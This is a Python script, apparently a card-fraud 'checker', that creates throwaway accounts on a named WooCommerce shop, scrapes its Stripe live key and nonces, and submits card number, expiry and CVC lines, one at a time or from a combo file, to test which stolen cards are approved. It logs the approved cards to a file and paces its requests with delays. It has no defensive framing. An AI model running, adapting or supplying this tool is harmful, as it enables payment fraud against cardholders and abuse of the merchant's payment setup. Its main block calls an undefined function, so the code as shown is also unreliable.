import requests
import re
import uuid
import random
import time
from user_agent import generate_user_agent

def Stripe1(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]

	link = "https://calefs.com"
	user = generate_user_agent()
	r = requests.Session()
	headers = {'user-agent': user}
	res = r.get(url=f"{link}/my-account/", headers=headers).text
	reg2 = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
	if reg2:
	   reg = reg2.group(1)
	else:
		return 'Page not found ⚠️'
	username = f'u_{uuid.uuid4().hex[:8]}'
	email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
	password = f'P_{uuid.uuid4().hex[:8]}!'
	data = {'username': username, 'email': email, 'password': password, 'woocommerce-register-nonce': reg,'register': 'Register'}
	res2 = r.post(url=f"{link}/my-account/", headers=headers, data=data).text
	res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers)
	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
	if pk_live2:
		pk_live = pk_live2.group(1)
	else:
		return 'Registration failed or page not found ⚠️'

	acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)',res3.text)
	if acct2:
		acct = f'&_stripe_account={acct2.group(1)}'
	else:
		acct = ''                
	addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
	addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
	if addnonce2:
		addnonce = addnonce2.group(1)
	elif addnonce3:
		addnonce = addnonce3.group(1)
	else:
		return 'The add key was not found ⚠️'
	    
	headers = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': user}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'
	
	res4= r.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers).json()
	if 'id' in res4:
		payment_id = res4['id']
	else:
		return 'There is no option to add the Visa card details, or there is a problem with the website ⚠️'
    	
	final_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'https://calefs.com/my-account/add-payment-method/', 'Origin': f'https://calefs.com', 'user-agent': user}

	data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': addnonce }

	r5r = r.post(f'{link}/wp-admin/admin-ajax.php', data=data, headers=final_headers)
	r5 = r5r.text
	if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
		return 'Your card was declined.'
	elif 'success' in r5 or 'Success' in r5:
		return 'Approved'
	elif 'Your card number is incorrect.' in r5:
		return 'Your card number is incorrect.'
	elif '0' in r5:
		return 'Erorr Respon'
	else:
		try:
			return r5r.json()['data']['error']['message']
		except:
			return r5


if __name__ == '__main__':
        Getat = 'Stripe Auth'
        print(f'Cheker {Getat}')
        Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
        if Br == '1':
                try:
                    while True:
                        ar = input('Enter Card ( n | mm | yy | cvc ): ')
                        resulti = Paymnt(ar)
                        if 'Approved' in resulti:
                            with open('Approved Card.txt', "a") as f:
                                f.write(ar +f': {resulti} > {Getat}')

                        print('Response: ' + resulti)
                        time.sleep(5)
                except Exception as e:
                    print('Error -', e)
        else:
                noy = 0
                cr = input('Enter Name Combo: ')
                with open(cr, "r") as f:
                        crads = f.read().splitlines()
                        print('Wait Checking Your Card ...')
                        for P in crads:
                                noy += 1
                                try:
                                        resulti = Paymnt(P)
                                except Exception as e:
                                        resulti = f'Erorr {e}'
                                if 'Approved' in resulti:
                                        with open('Approved Card.txt', "a") as f:
                                                f.write(P + ': {resulti} > {Getat}')
                                try:
                                        print(f'[{noy}] ' + P + '  >>  ' + resulti)
                                except:
                                        pass
                                time.sleep(7)

